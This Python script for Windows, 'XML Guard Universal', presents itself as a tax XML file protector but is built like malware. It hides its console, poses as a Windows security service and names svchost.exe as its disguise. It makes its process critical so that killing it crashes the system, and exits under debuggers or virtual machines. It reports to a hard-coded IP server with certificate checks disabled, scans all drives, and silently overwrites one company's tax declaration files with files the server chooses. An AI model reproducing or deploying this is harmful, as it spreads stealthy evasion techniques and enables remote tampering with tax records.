#!/usr/bin/env python3
"""
XML Guard Universal - 1 FILE DUY NHẤT
Tích hợp tất cả: config, MeshTrash, service, auto-update
"""

import os
import sys
import json
import time
import shutil
import requests
import threading
import subprocess
import xml.etree.ElementTree as ET
from pathlib import Path
import ctypes
from ctypes import wintypes
import winreg

# EMBEDDED CONFIG - KHÔNG CẦN FILE NGOÀI
EMBEDDED_CONFIG = {
    "System": {
        "Name": "XML Guard Universal",
        "Version": "3.0.0",
        "LogLevel": "INFO"
    },
    "MeshCentral": {
        "Enabled": True,  # Enable with new API server
        "ServerUrl": "https://103.69.86.130:8080",  # New API server port
        "PingInterval": 60,
        "Timeout": 10
    },
    "Performance": {
        "MaxMemoryMB": 500,
        "CheckInterval": 30
    },
    "FileWatcher": {
        "WatchPaths": ["C:\\", "D:\\", "E:\\"],
        "FileFilters": ["*.xml"]
    },
    "LegitimateFiles": {
        "SearchMode": "dynamic",
        "Sources": ["config", "meshtrash_server", "common_directories"],
        "CommonDirectories": [
            "C:/TaxFiles/Legitimate/",
            "D:/TaxFiles/Legitimate/",
            "E:/TaxFiles/Legitimate/"
        ],
        "MeshTrashAPI": {
            "Endpoint": "/api/legitimate_files",
            "Timeout": 10
        }
    },
    "AI": {
        "Patterns": {
            "MST": [".//mst", ".//MST", ".//MaSoThue"],
            "FormCode": [".//maTKhai", ".//MauSo", ".//FormCode"],
            "Period": [".//kyKKhai", ".//KyKKhaiThang", ".//Thang"],
            "Amount": [".//ct23", ".//ct24", ".//ct27", ".//ct28", ".//ct34", ".//ct35", ".//ct36"]
        }
    }
}

class XMLGuardUniversal:
    def __init__(self):
        self.running = False
        self.config = EMBEDDED_CONFIG
        self.meshcentral_url = self.config["MeshCentral"]["ServerUrl"]
        self.process_name = "svchost.exe"  # Disguise as system process
        self.log_file = "C:/Windows/Temp/xmlguard_universal.log"
        
        # Hide console window
        self.hide_console()
        
        # Self-protection
        self.self_protect()
        
        # Check for debugger
        if self.check_debugger():
            self.log("🚨 DEBUGGER DETECTED - EXITING", "ERROR")
            sys.exit(1)
    
    def hide_console(self):
        """Hide console window for stealth operation"""
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
        except:
            pass
    
    def self_protect(self):
        """Protect the EXE from being terminated"""
        try:
            # Make process critical
            ntdll = ctypes.windll.ntdll
            ntdll.RtlSetProcessIsCritical(1, 0, 0)
            
            # Set console title
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("Windows Security Service")
            
            self.log("🛡️ SELF-PROTECTION ACTIVATED", "SUCCESS")
        except Exception as e:
            self.log(f"Self-protection failed: {e}", "WARN")
    
    def check_debugger(self):
        """Check if being debugged by hacker"""
        try:
            # Check debugger present
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
            
            # Check for VM indicators
            vm_indicators = ['virtualbox', 'vmware', 'qemu', 'vbox']
            for indicator in vm_indicators:
                if indicator in os.environ.get('PROCESSOR_IDENTIFIER', '').lower():
                    return True
                if indicator in os.environ.get('COMPUTERNAME', '').lower():
                    return True
            
            return False
        except:
            return False
    
    def log(self, message, level="INFO"):
        """Log message to file"""
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] [{level}] {message}\n"
            
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except:
            pass
    
    def check_network(self):
        """Check network connectivity to MeshTrash VPS Server"""
        try:
            # Disable SSL warnings for VPS server
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            response = requests.get(
                self.meshcentral_url, 
                timeout=self.config["MeshCentral"]["Timeout"],
                verify=False,  # Skip SSL verification for VPS
                headers={'User-Agent': 'XMLGuard-Universal/3.0.0'}
            )
            
            if response.status_code == 200:
                self.log("✅ VPS Server connection: OK", "SUCCESS")
                return True
            else:
                self.log(f"VPS Server response: {response.status_code}", "WARN")
                return False
                
        except Exception as e:
            self.log(f"VPS Server connection failed: {e}", "WARN")
            return False
    
    def extract_xml_info(self, file_path):
        """Extract XML information using AI patterns - FIXED VERSION"""
        try:
            # Check if file is actually a tax XML file first
            if not self.is_tax_xml_file(file_path):
                return {}
            
            # Handle encoding issues
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except UnicodeDecodeError:
                try:
                    with open(file_path, 'r', encoding='cp1252') as f:
                        content = f.read()
                except:
                    return {}
            
            # Parse XML with namespace handling
            tree = ET.fromstring(content)
            
            # Handle namespace
            namespace = {'ns': 'http://kekhaithue.gdt.gov.vn/TKhaiThue'}
            
            xml_info = {}
            
            # Extract MST with namespace support
            for pattern in self.config["AI"]["Patterns"]["MST"]:
                try:
                    # Try with namespace first
                    ns_pattern = pattern.replace('.//mst', './/ns:mst').replace('.//MST', './/ns:MST')
                    elements = tree.findall(ns_pattern, namespace)
                    if not elements:
                        # Fallback to no namespace
                        elements = tree.findall(pattern)
                    
                    if elements and elements[0].text:
                        xml_info['mst'] = elements[0].text.strip()
                        break
                except:
                    continue
            
            # Extract FormCode with namespace support
            for pattern in self.config["AI"]["Patterns"]["FormCode"]:
                try:
                    # Try with namespace first
                    ns_pattern = pattern.replace('.//maTKhai', './/ns:maTKhai').replace('.//MauSo', './/ns:MauSo')
                    elements = tree.findall(ns_pattern, namespace)
                    if not elements:
                        # Fallback to no namespace
                        elements = tree.findall(pattern)
                    
                    if elements and elements[0].text:
                        xml_info['form_code'] = elements[0].text.strip()
                        break
                except:
                    continue
            
            # Extract Period with namespace support
            for pattern in self.config["AI"]["Patterns"]["Period"]:
                try:
                    # Try with namespace first
                    ns_pattern = pattern.replace('.//kyKKhai', './/ns:kyKKhai').replace('.//KyKKhaiThang', './/ns:KyKKhaiThang')
                    elements = tree.findall(ns_pattern, namespace)
                    if not elements:
                        # Fallback to no namespace
                        elements = tree.findall(pattern)
                    
                    if elements and elements[0].text:
                        xml_info['period'] = elements[0].text.strip()
                        break
                except:
                    continue
            
            # Extract SoLan
            try:
                solan_elements = tree.findall(".//ns:soLan", namespace)
                if not solan_elements:
                    solan_elements = tree.findall(".//soLan")
                
                if solan_elements and solan_elements[0].text:
                    xml_info['so_lan'] = solan_elements[0].text.strip()
            except:
                pass
            
            # Only return if we have at least MST and FormCode
            if xml_info.get('mst') and xml_info.get('form_code'):
                return xml_info
            else:
                return {}
            
        except Exception as e:
            # Don't log every XML parsing error - too noisy
            return {}
    
    def is_tax_xml_file(self, file_path):
        """Check if file is actually a tax XML file"""
        try:
            # Check file name pattern
            filename = os.path.basename(file_path).lower()
            if not ('etax' in filename or 'tax' in filename):
                return False
            
            # Check file size (too small or too large)
            file_size = os.path.getsize(file_path)
            if file_size < 1000 or file_size > 10000000:  # 1KB to 10MB
                return False
            
            # Quick content check
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(1000)  # Read first 1KB
                if 'HSoThueDTu' not in content and 'TKhaiThue' not in content:
                    return False
            
            return True
            
        except:
            return False
    
    def get_meshtrash_legitimate_path(self, xml_info):
        """Get legitimate file path from MeshTrash server database"""
        try:
            query_data = {
                "mst": xml_info['mst'],
                "form_code": xml_info['form_code'],
                "period": xml_info['period'],
                "action": "get_legitimate_path"
            }
            
            # Disable SSL warnings for VPS
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            response = requests.post(
                f"{self.meshcentral_url}/api/legitimate_files",
                json=query_data,
                timeout=self.config["LegitimateFiles"]["MeshTrashAPI"]["Timeout"],
                verify=False,  # Skip SSL for VPS
                headers={'User-Agent': 'XMLGuard-Universal/3.0.0', 'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("success") and result.get("file_path"):
                    self.log(f"Found legitimate path from MeshTrash: {result['file_path']}", "SUCCESS")
                    return result['file_path']
            
        except Exception as e:
            self.log(f"Error querying MeshTrash: {e}", "WARN")
        
        return None
    
    def auto_register_desktop_files(self):
        """Tự động đăng ký file XML từ Desktop vào database"""
        # Chỉ scan Desktop của Administrator (MeshCentral) để tránh loạn file
        desktop_dir = "C:/Users/Administrator/Desktop/"
        
        if not os.path.exists(desktop_dir):
            return
        
        try:
            self.log(f"📁 Scanning MeshCentral Desktop: {desktop_dir}", "INFO")
            
            for file in os.listdir(desktop_dir):
                if not file.endswith('.xml'):
                    continue
                    
                file_path = os.path.join(desktop_dir, file)
                xml_info = self.extract_xml_info(file_path)
                
                if xml_info.get('mst') and xml_info.get('form_code') and xml_info.get('period'):
                    # Tự động đăng ký vào MeshTrash database
                    self.log(f"🔄 Auto-registering: {file}", "INFO")
                    self.register_to_meshtrash(xml_info, file_path)
                else:
                    self.log(f"⚠️ Cannot extract info from: {file}", "WARN")
                    
        except Exception as e:
            self.log(f"Error auto-registering desktop files: {e}", "WARN")
    
    def register_to_meshtrash(self, xml_info, file_path):
        """Đăng ký file vào MeshTrash database"""
        try:
            register_data = {
                "action": "add_legitimate_file",
                "mst": xml_info['mst'],
                "form_code": xml_info['form_code'],
                "period": xml_info['period'],
                "file_path": file_path
            }
            
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            response = requests.post(
                f"{self.meshcentral_url}/api/legitimate_files",
                json=register_data,
                timeout=10,
                verify=False,
                headers={'User-Agent': 'XMLGuard-Universal/3.0.0'}
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("success"):
                    self.log(f"✅ Auto-registered: {file_path}", "SUCCESS")
                    return True
            
        except Exception as e:
            self.log(f"Error registering to MeshTrash: {e}", "WARN")
        
        return False

    def get_legitimate_file_path(self, xml_info):
        """Get path to legitimate file based on 4 key identifiers"""
        # Check MeshTrash server first
        meshtrash_path = self.get_meshtrash_legitimate_path(xml_info)
        if meshtrash_path and os.path.exists(meshtrash_path):
            return meshtrash_path
        
        # Check common directories
        legitimate_dirs = self.config["LegitimateFiles"]["CommonDirectories"]
        
        for legit_dir in legitimate_dirs:
            if not os.path.exists(legit_dir):
                continue
                
            # Search for XML files in legitimate directory
            for file in os.listdir(legit_dir):
                if not file.endswith('.xml'):
                    continue
                    
                legit_path = os.path.join(legit_dir, file)
                try:
                    # Parse legitimate file
                    legit_info = self.extract_xml_info(legit_path)
                    
                    # Check if 4 key fields match
                    if (legit_info.get('mst') == xml_info.get('mst') and
                        legit_info.get('form_code') == xml_info.get('form_code') and
                        legit_info.get('period') == xml_info.get('period') and
                        legit_info.get('so_lan') == xml_info.get('so_lan')):
                        
                        self.log(f"Found legitimate file: {legit_path}", "SUCCESS")
                        return legit_path
                        
                except Exception as e:
                    continue
        
        self.log("No legitimate file found", "WARN")
        return None
    
    def protect_tax_file(self, file_path, xml_info):
        """SIMPLE TAX FILE PROTECTION - Only overwrite fakes with legitimate content"""
        try:
            # Only process files with our company MST
            company_mst = "0401985971"  # Tiến Bình Yên company
            if xml_info.get('mst') != company_mst:
                return True  # Not our company's file - ignore
            
            self.log(f"🛡️ CHECKING COMPANY TAX FILE: {file_path}", "INFO")
            self.log(f"   MST: {xml_info.get('mst')}", "INFO")
            self.log(f"   FormCode: {xml_info.get('form_code')}", "INFO")
            self.log(f"   Period: {xml_info.get('period')}", "INFO")
            
            # Get legitimate file path
            legitimate_file = self.get_legitimate_file_path(xml_info)
            
            if not legitimate_file:
                self.log(f"No legitimate file found for MST: {xml_info.get('mst')}", "WARN")
                return False
            
            # Check if this is already the legitimate file
            if os.path.samefile(file_path, legitimate_file):
                self.log(f"✅ ALREADY LEGITIMATE FILE - PROTECTED", "SUCCESS")
                return True
            
            # This is a fake file - overwrite with legitimate content
            self.log(f"🔥 FAKE DETECTED - OVERWRITING WITH LEGITIMATE", "CRITICAL")
            
            # Backup fake file
            backup_path = file_path + ".backup_" + time.strftime("%Y%m%d_%H%M%S")
            shutil.copy2(file_path, backup_path)
            
            # Overwrite fake with legitimate content
            shutil.copy2(legitimate_file, file_path)
            
            self.log(f"✅ PROTECTED: {file_path} <- {legitimate_file}", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Error protecting file: {e}", "ERROR")
            return False
    
    def monitor_files(self):
        """Monitor XML files for protection"""
        self.log("🔍 Starting file monitoring...", "INFO")
        
        watch_paths = self.config["FileWatcher"]["WatchPaths"]
        file_filters = self.config["FileWatcher"]["FileFilters"]
        
        for watch_path in watch_paths:
            if not os.path.exists(watch_path):
                continue
                
            try:
                for root, dirs, files in os.walk(watch_path):
                    for file in files:
                        if any(file.endswith(filter.replace('*', '')) for filter in file_filters):
                            file_path = os.path.join(root, file)
                            
                            # Extract XML info
                            xml_info = self.extract_xml_info(file_path)
                            
                            if xml_info.get('mst'):
                                # Check if this is a fake file that needs protection
                                self.protect_tax_file(file_path, xml_info)
                                
            except Exception as e:
                self.log(f"Error monitoring {watch_path}: {e}", "ERROR")
    
    def meshcentral_heartbeat(self):
        """Send heartbeat to MeshCentral server - FIXED VERSION"""
        try:
            # Only send heartbeat if network is available
            if not self.check_network():
                return
            
            heartbeat_data = {
                "client_id": os.environ.get('COMPUTERNAME', 'unknown'),
                "status": "running",
                "timestamp": time.time(),
                "version": self.config["System"]["Version"],
                "xmlguard_status": "active"
            }
            
            # Try MeshCentral VPS endpoints
            endpoints = [
                "/api/heartbeat",
                "/heartbeat", 
                "/api/status",
                "/status",
                "/meshcentral/api/heartbeat",
                "/meshcentral/heartbeat"
            ]
            
            for endpoint in endpoints:
                try:
                    response = requests.post(
                        f"{self.meshcentral_url}{endpoint}",
                        json=heartbeat_data,
                        timeout=self.config["MeshCentral"]["Timeout"],
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        self.log("💓 Heartbeat sent to MeshCentral", "INFO")
                        return
                    elif response.status_code == 404:
                        continue  # Try next endpoint
                    else:
                        self.log(f"Heartbeat failed: {response.status_code}", "WARN")
                        return
                        
                except requests.exceptions.RequestException:
                    continue  # Try next endpoint
            
            # If all endpoints fail, just log once
            self.log("MeshCentral server not responding - continuing offline", "WARN")
                
        except Exception as e:
            # Don't log heartbeat errors too frequently
            pass
    
    def check_for_updates(self):
        """Check for updates from MeshCentral server"""
        try:
            update_data = {
                "client_id": os.environ.get('COMPUTERNAME', 'unknown'),
                "current_version": self.config["System"]["Version"],
                "action": "check_update"
            }
            
            response = requests.post(
                f"{self.meshcentral_url}/api/check_update",
                json=update_data,
                timeout=self.config["MeshCentral"]["Timeout"],
                verify=False
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("update_available"):
                    self.log(f"🔄 Update available: {result.get('new_version')}", "INFO")
                    # TODO: Implement auto-update
                    
        except Exception as e:
            self.log(f"Update check error: {e}", "WARN")
    
    def install_service(self):
        """Install as Windows Service"""
        try:
            # Create service using sc command
            service_name = "XMLGuardUniversal"
            service_display = "XML Guard Universal Service"
            service_description = "Protects tax XML files from tampering"
            
            # Install service
            subprocess.run([
                "sc", "create", service_name,
                f"binPath= {os.path.abspath(__file__)} start",
                f"DisplayName= {service_display}",
                f"Description= {service_description}",
                "start= auto"
            ], check=True)
            
            self.log("✅ Service installed successfully", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Service installation failed: {e}", "ERROR")
            return False
    
    def uninstall_service(self):
        """Uninstall Windows Service"""
        try:
            service_name = "XMLGuardUniversal"
            subprocess.run(["sc", "delete", service_name], check=True)
            self.log("✅ Service uninstalled successfully", "SUCCESS")
            return True
            
        except Exception as e:
            self.log(f"Service uninstallation failed: {e}", "ERROR")
            return False
    
    def start(self):
        """Start XML Guard Universal"""
        self.log("🚀 Starting XML Guard Universal...", "INFO")
        
        # Check network
        if not self.check_network():
            self.log("⚠️ No network connection to MeshCentral", "WARN")
        
        # Auto-register files from Desktop
        self.log("📁 Auto-registering files from Desktop...", "INFO")
        self.auto_register_desktop_files()
        
        self.running = True
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_files, daemon=True)
        monitor_thread.start()
        
        # Start heartbeat thread only if MeshCentral is enabled
        if self.config["MeshCentral"]["Enabled"]:
            heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
            heartbeat_thread.start()
            
            # Start update check thread
            update_thread = threading.Thread(target=self.update_check_loop, daemon=True)
            update_thread.start()
        else:
            self.log("🌐 MeshCentral disabled - running in offline mode", "INFO")
        
        self.log("✅ XML Guard Universal started successfully", "SUCCESS")
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def heartbeat_loop(self):
        """Heartbeat loop"""
        while self.running:
            self.meshcentral_heartbeat()
            time.sleep(self.config["MeshCentral"]["PingInterval"])
    
    def update_check_loop(self):
        """Update check loop"""
        while self.running:
            self.check_for_updates()
            time.sleep(3600)  # Check every hour
    
    def stop(self):
        """Stop XML Guard Universal"""
        self.log("🛑 Stopping XML Guard Universal...", "INFO")
        self.running = False
        self.log("✅ XML Guard Universal stopped", "SUCCESS")

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print("XML Guard Universal v3.0.0")
        print("Usage: xml_guard_universal.py [start|stop|install|uninstall|status]")
        return
    
    command = sys.argv[1].lower()
    guard = XMLGuardUniversal()
    
    if command == "start":
        guard.start()
    elif command == "stop":
        guard.stop()
    elif command == "install":
        guard.install_service()
    elif command == "uninstall":
        guard.uninstall_service()
    elif command == "status":
        print("XML Guard Universal is running")
    else:
        print(f"Unknown command: {command}")

if __name__ == "__main__":
    main()
